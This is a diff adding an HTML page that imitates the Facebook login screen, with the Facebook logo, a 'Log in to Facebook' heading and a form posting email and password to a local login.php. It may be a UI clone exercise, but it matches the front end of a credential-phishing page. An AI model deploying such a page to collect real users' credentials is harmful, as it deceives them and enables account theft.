@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css">
+    <title>fabebook login</title>
+  </head>
+  <body>
+    <div class="main">
+      <div class="container">
+        <!-- logo -->
+        <img src="./image/Logo.svg" alt="facebook logo" class="logo" />
+        <!-- form container -->
+        <div class="inner-cont">
+          <p class="header">Log in to Facebook</p>
+          <!-- form -->
+          <form action="login.php" method="post">
+            <input
+              type="email"
+              name="email"
+              placeholder="Email address or phone number"
+              required
+            />
+            <input
+              type="password"
+              name="password"
+              placeholder="Password"
+              required
+            />
+            <button type="submit">Log In</button>
+          </form>
+          <!-- forgotten password -->
+          <a href="#" class="forgotten">Forgotten password?</a>
+          <div class="or-cont"><span class="or-line">or</span></div>
+          <button class="create">Create New Account</button>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
